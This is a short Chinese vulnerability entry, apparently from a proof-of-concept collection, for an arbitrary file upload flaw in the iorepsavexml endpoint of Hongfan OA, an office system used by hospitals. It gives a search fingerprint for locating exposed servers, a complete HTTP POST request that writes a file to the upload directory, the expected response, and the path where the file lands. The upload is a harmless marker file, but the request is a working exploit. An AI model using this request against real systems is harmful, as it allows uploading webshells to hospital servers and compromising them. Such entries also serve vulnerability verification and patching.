﻿# 红帆OA iorepsavexml 任意文件上传漏洞

> 更新时间：2023-12-20

> 漏洞编号：

> 漏洞说明：红帆oa系统为医院提供oA功能,完成信息发布、流程审批、公文管理、日程管理、工作安排、文件传递、在线沟通等行政办公业务。红帆OA iorepsavexml 接口存在任意文件上传漏洞，成功利用此漏洞可上传恶意文件至服务器。

> 漏洞特征：app="红帆-ioffice"

> 验证脚本：HTTP

```
POST /iOffice/prg/set/report/iorepsavexml.aspx?key=writefile&filename=dudesuite.txt&filepath=/upfiles/rep/pic/ HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language:zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6

dudesuite
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：/iOffice/upfiles/rep/pic/dudesuite.txt


> 验证文件来源：红帆OA iorepsavexml 任意文件上传漏洞.poc
